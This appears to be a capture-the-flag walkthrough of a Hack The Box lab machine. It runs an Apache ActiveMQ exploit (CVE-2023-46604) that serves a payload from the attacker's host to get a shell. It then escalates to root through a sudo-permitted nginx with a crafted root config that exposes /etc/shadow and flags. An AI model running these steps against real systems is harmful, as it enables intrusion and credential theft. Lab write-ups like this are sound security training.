## Recon Time
```
└─# nmap -sS -vvv -Pn --min-rate 2000 $ip            
Nmap scan report for 10.10.11.243
Host is up, received user-set (0.85s latency).
Scanned at 2023-11-13 09:14:42 GMT for 5s
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 63
80/tcp   open  http          syn-ack ttl 63
5050/tcp open  mmcc          syn-ack ttl 63
6789/tcp open  ibm-db2-admin syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap

└─# nmap -sC -sV -Pn -p80,5050,6789 $ip                          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-13 09:15 GMT
Nmap scan report for 10.10.11.243
Host is up (0.50s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
5050/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
6789/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE    TIME               FILENAME
| -       06-Nov-2023 01:10  bin/
| -       06-Nov-2023 01:10  bin/X11/
| 963     17-Feb-2020 14:11  bin/NF
| 129576  27-Oct-2023 11:38  bin/VGAuthService
| 51632   07-Feb-2022 16:03  bin/%5B
| 35344   19-Oct-2022 14:52  bin/aa-enabled
| 35344   19-Oct-2022 14:52  bin/aa-exec
| 31248   19-Oct-2022 14:52  bin/aa-features-abi
| 14478   04-May-2023 11:14  bin/add-apt-repository
| 14712   21-Feb-2022 01:49  bin/addpart
|_
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
On port 80, i used admin/admin and i logged in and now i see activeMQ.
Search for available exploit
```
└─# searchsploit activemq
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
ActiveMQ < 5.14.0 - Web Shell Upload (Metasploit)                               | java/remote/42283.rb
Apache ActiveMQ 5.11.1/5.13.2 - Directory Traversal / Command Execution         | windows/remote/40857.txt
Apache ActiveMQ 5.2/5.3 - Source Code Information Disclosure                    | multiple/remote/33868.txt
Apache ActiveMQ 5.3 - 'admin/queueBrowse' Cross-Site Scripting                  | multiple/remote/33905.txt
Apache ActiveMQ 5.x-5.11.1 - Directory Traversal Shell Upload (Metasploit)      | windows/remote/48181.rb
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
I will now use msfconsole. scanner/http/apache_activemq_traversal
I found this for 2023. https://deepkondah.medium.com/unpacking-the-apache-activemq-exploit-cve-2023-46604-92ed1c125b53
Also i found these 2 poc avalaibale on github.
https://github.com/evkl1d/CVE-2023-46604
https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

I got my shell now using.
```
┌──(root㉿1337)-[/home/…/HacktheBox/Machines/tools/CVE-2023-46604-ActiveMQ-RCE-pseudoshell]
└─# python3 exploit.py -i 10.10.11.243 -si 10.10.16.33 -sp 8080 
#################################################################################
#  CVE-2023-46604 - Apache ActiveMQ - Remote Code Execution - Pseudo Shell      #
#  Exploit by Ducksec, Original POC by X1r0z, Python POC by evkl1d              #
#################################################################################

[*] Target: 10.10.11.243:61616
[*] Serving XML at: http://10.10.16.33:8080/poc.xml
[!] This is a semi-interactive pseudo-shell, you cannot cd, but you can ls-lah / for example.
[*] Type 'exit' to quit

#################################################################################
# Not yet connected, send a command to test connection to host.                 #
# Prompt will change to Apache ActiveMQ$ once at least one response is received #
# Please note this is a one-off connection check, re-run the script if you      #
# want to re-check the connection.                                              #
#################################################################################

[Target not responding!]$ id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)

Apache ActiveMQ$ whoami
activemq
```
```
activemq@broker:~$ ls
ls
user.txt
activemq@broker:~$ cat user.txt
cat user.txt
815eb798c26c279161b0e3f14ebbfa35
activemq@broker:~$ 

```

## privilege Escalation
```
activemq@broker:~$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
activemq@broker:~$ 
```
Interessting.
I will create file.conf into /tmp
```
echo '
user root; 
worker_processes 4; 
pid /tmp/n.pid; 
events { 
 worker_connections 100;
} 
http { 
 server { 
  listen 65000; 
  root /; 
  autoindex on; 
  dav_methods PUT; 
 } 
}' >> file.conf
```
```
└─# curl -o n.conf http://10.10.11.243:9001/file.conf
└─# wget http://10.10.11.243:9001/file.conf
--2023-11-13 10:15:58--  http://10.10.11.243:9001/file.conf
Connecting to 10.10.11.243:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 178 [application/octet-stream]
Saving to: ‘file.conf’

file.conf        100%[=======>]     178  --.-KB/s    in 0s      

2023-11-13 10:16:02 (11.9 MB/s) - ‘file.conf’ saved [178/178]




```

## File Read
I can define my own server and then read file.
```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
>> blo.conf

```
Here i can just read file.
```
First i will execute the nginx
activemq@broker:/dev/shm$ sudo /usr/sbin/nginx -c /dev/shm/blo.conf

and then i will access on my own local machine by reading sensitive files.
└─# curl http://10.10.11.243:1337/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin

└─# curl http://10.10.11.243:1337/etc/shadow
root:$y$j9T$S6NkiGlTDU3IUcdBZEjJe0$sSHRUiGL/v4FZkWjU.HZ6cX2vsMY/rdFBTt25LbGxf1:19666:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::

```
This is enough to solve this Box. I can crack this hashes password.
```
└─# curl http://10.10.11.243:1337/root/root.txt
bd29cb8e01fd597e42f3cce016a71efb


```